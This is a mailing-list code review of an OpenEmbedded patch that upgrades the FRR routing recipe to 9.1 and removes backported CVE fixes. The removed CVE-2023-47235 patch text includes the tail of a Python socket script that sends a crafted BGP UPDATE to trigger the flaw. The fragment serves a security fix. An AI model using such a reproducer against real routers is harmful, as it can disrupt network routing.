> -data =3D s.recv(1024)
> -s.send(UPDATE)
> -data =3D s.recv(1024)
> -time.sleep(100)
> -s.close()
> -```
> -
> -Reported-by: Iggy Frankovic <iggyfran@amazon.com>
> -Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
> -Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/6814f=
2e0138a6ea5e1f83bdd9085d9a77999900b]
> -CVE: CVE-2023-47235
> -Signed-off-by: Jonas Gorski <jonas.gorski@bisdn.de>
> ----
> - bgpd/bgp_attr.c | 15 ++++++++++++---
> - 1 file changed, 12 insertions(+), 3 deletions(-)
> -
> -diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
> -index cf2dbe65b805..1473dc772502 100644
> ---- a/bgpd/bgp_attr.c
> -+++ b/bgpd/bgp_attr.c
> -@@ -3391,10 +3391,13 @@ static int bgp_attr_check(struct peer *peer, str=
uct attr *attr,
> -       uint8_t type =3D 0;
> -
> -       /* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled a=
s an
> --       * empty UPDATE.  */
> -+       * empty UPDATE. Treat-as-withdraw, otherwise if we just ignore i=
t,
> -+       * we will pass it to be processed as a normal UPDATE without man=
datory
> -+       * attributes, that could lead to harmful behavior.
> -+       */
> -       if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&
> -           !length)
> --              return BGP_ATTR_PARSE_PROCEED;
> -+              return BGP_ATTR_PARSE_WITHDRAW;
> -
> -       /* "An UPDATE message that contains the MP_UNREACH_NLRI is not re=
quired
> -          to carry any other path attributes.", though if MP_REACH_NLRI =
or NLRI
> -@@ -3889,7 +3892,13 @@ done:
> -       aspath_unintern(&as4_path);
> -
> -       transit =3D bgp_attr_get_transit(attr);
> --      if (ret !=3D BGP_ATTR_PARSE_ERROR) {
> -+      /* If we received an UPDATE with mandatory attributes, then
> -+       * the unrecognized transitive optional attribute of that
> -+       * path MUST be passed. Otherwise, it's an error, and from
> -+       * security perspective it might be very harmful if we continue
> -+       * here with the unrecognized attributes.
> -+       */
> -+      if (ret =3D=3D BGP_ATTR_PARSE_PROCEED) {
> -               /* Finally intern unknown attribute. */
> -               if (transit)
> -                       bgp_attr_set_transit(attr, transit_intern(transit=
));
> ---
> -2.42.1
> -
> diff --git a/meta-networking/recipes-protocols/frr/frr_9.0.1.bb b/meta-ne=
tworking/recipes-protocols/frr/frr_9.1.bb
> similarity index 94%
> rename from meta-networking/recipes-protocols/frr/frr_9.0.1.bb
> rename to meta-networking/recipes-protocols/frr/frr_9.1.bb
> index c447df051..9db6710d9 100644
> --- a/meta-networking/recipes-protocols/frr/frr_9.0.1.bb
> +++ b/meta-networking/recipes-protocols/frr/frr_9.1.bb
> @@ -11,16 +11,11 @@ LIC_FILES_CHKSUM =3D "file://doc/licenses/GPL-2.0;md5=
=3Db234ee4d69f5fce4486a80fdaf4a
>
>  PR =3D "r1"

let's use this opportunity to drop PR above while you are here.

>
> -SRC_URI =3D "git://github.com/FRRouting/frr.git;protocol=3Dhttps;branch=
=3Dstable/9.0 \
> +SRC_URI =3D "git://github.com/FRRouting/frr.git;protocol=3Dhttps;branch=
=3Dstable/9.1 \
>             file://frr.pam \
> -           file://0001-tools-make-quiet-actually-suppress-output.patch \
> -           file://CVE-2023-46752.patch \
> -           file://CVE-2023-46753.patch \
> -           file://CVE-2023-47235.patch \
> -           file://CVE-2023-47234.patch \
>             "
>
> -SRCREV =3D "31ed3dd753d62b5d8916998bc32814007e91364b"
> +SRCREV =3D "312faf8008bb4f3b9e84b8e2758cd2cbdf5742b5"
>
>  UPSTREAM_CHECK_GITTAGREGEX =3D "frr-(?P<pver>\d+(\.\d+)+)$"
>
> --
> 2.34.1
>
>
> -=3D-=3D-=3D-=3D-=3D-=3D-=3D-=3D-=3D-=3D-=3D-
> Links: You receive all messages sent to this group.
> View/Reply Online (#107072): https://lists.openembedded.org/g/openembedde=
d-devel/message/107072
> Mute This Topic: https://lists.openembedded.org/mt/102847210/1997914
> Group Owner: openembedded-devel+owner@lists.openembedded.org
> Unsubscribe: https://lists.openembedded.org/g/openembedded-devel/unsub [r=
aj.khem@gmail.com]
> -=3D-=3D-=3D-=3D-=3D-=3D-=3D-=3D-=3D-=3D-=3D-
>

